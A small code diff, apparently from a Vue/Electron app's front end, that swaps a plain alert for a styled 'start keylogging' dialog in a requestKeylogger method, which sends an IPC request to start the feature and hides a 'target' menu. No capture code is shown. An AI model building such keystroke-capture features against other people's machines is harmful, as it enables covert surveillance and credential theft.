@@ -137,7 +137,13 @@ export default {
      */
     requestKeylogger () {
       ipcRenderer.once('keyloggerStart', (event, stream) => {
-        alert('Vue:' + stream)
+        this.$alert('开始键盘记录', {
+          confirmButtonText: '确定',
+          callback: action => {
+            let targetMenu = document.querySelector('#targetMenu')
+            targetMenu.style.display = 'none'
+          }
+        })
       })
       ipcRenderer.send('requestKeylogger', 'start')
     },
